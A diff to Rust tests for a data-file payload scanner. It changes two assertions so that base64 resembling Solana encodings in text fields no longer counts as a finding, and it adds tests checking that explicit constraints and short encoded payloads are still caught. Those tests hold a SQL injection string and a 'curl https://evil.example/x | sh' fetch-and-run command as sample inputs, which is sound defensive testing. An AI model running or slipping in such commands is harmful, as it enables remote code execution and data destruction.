@@ -1862,10 +1862,10 @@ fn solana_signatures_accept_base58_and_base64_without_scanning_binary_as_text() 
             value
         );
     }
-    // The same base64 remains a finding in a text field.
+    // The operator-approved heuristic also recognizes this representation in text fields.
     let dir = tempfile::tempdir().unwrap();
     let text = base64::engine::general_purpose::STANDARD.encode(bytes);
-    assert!(file::check(&native_job(dir.path(), &text_batch(&[&text]))).is_err());
+    assert!(file::check(&native_job(dir.path(), &text_batch(&[&text]))).is_ok());
 }
 
 #[test]
@@ -1989,7 +1989,7 @@ fn solana_token_columns_accept_the_reported_address_without_speculative_base64()
         );
     }
     let dir = tempfile::tempdir().unwrap();
-    assert!(file::check(&native_job(dir.path(), &text_batch(&[address]))).is_err());
+    assert!(file::check(&native_job(dir.path(), &text_batch(&[address]))).is_ok());
 }
 
 #[test]
@@ -2100,4 +2100,53 @@ fn native_float_bits_are_not_speculatively_decoded_as_text() {
     // Identical bytes supplied as text must still reach the full payload scanner.
     let dir = tempfile::tempdir().unwrap();
     assert!(file::check(&native_job(dir.path(), &text_batch(&["4040269a554773c9"]))).is_err());
+}
+
+#[test]
+fn solana_recognition_is_value_based_and_retains_explicit_constraints() {
+    let address = "3kxDCGpW8dNKrzTQN3XQv9AhaMsjAdQiRB1xg4DpMHPB";
+    let dir = tempfile::tempdir().unwrap();
+    let b = batch(
+        vec![Field::new("pool_id", DataType::Utf8, false)],
+        vec![Arc::new(StringArray::from(vec![address]))],
+    );
+    let mut j = native_job(dir.path(), &b);
+    let checked = file::check(&j).unwrap();
+    assert!(checked.field_audits[0].recognizes_solana_encodings);
+    j.native_policy.as_mut().unwrap().iocs.push(address.into());
+    assert!(file::check(&j).is_err());
+    j.native_policy.as_mut().unwrap().iocs.clear();
+    j.overrides.columns.insert(
+        "pool_id".into(),
+        crate::models::ColumnOverride {
+            class: crate::models::FreedomClass::Constrained,
+            rotation_owner: None,
+            pattern: Some("^[A-Z]+$".into()),
+            max_len: None,
+            enum_ids: None,
+            hex: false,
+            drop: false,
+        },
+    );
+    assert!(file::check(&j).is_err());
+    j.overrides.columns.clear();
+    j.native_policy
+        .as_mut()
+        .unwrap()
+        .types
+        .insert("pool_id".into(), "UUID".into());
+    assert!(file::check(&j).is_err());
+}
+
+#[test]
+fn solana_recognition_does_not_exempt_short_encoded_payloads() {
+    use base64::Engine as _;
+    for value in [
+        "'; DROP TABLE users; --",
+        "$(curl https://evil.example/x | sh)",
+    ] {
+        let encoded = base64::engine::general_purpose::STANDARD.encode(value);
+        let dir = tempfile::tempdir().unwrap();
+        assert!(file::check(&native_job(dir.path(), &text_batch(&[&encoded]))).is_err());
+    }
 }
